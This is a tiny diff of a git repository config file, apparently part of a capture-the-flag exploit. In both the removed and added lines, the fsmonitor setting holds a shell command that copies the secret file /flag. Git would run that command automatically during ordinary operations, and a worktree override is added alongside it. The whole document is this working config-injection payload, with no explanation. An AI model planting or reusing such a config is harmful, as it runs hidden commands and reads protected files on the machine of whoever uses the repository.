@@ -2,4 +2,5 @@
 	repositoryformatversion = 0
 	filemode = true
 	bare = false
-	fsmonitor = "cp /flag /tmp/https%3A%2F%2Fgithub%2ecom%2Fouxs-19%2Fwhtvr #"
+	fsmonitor = "cp /flag . #"
+	worktree = "."  
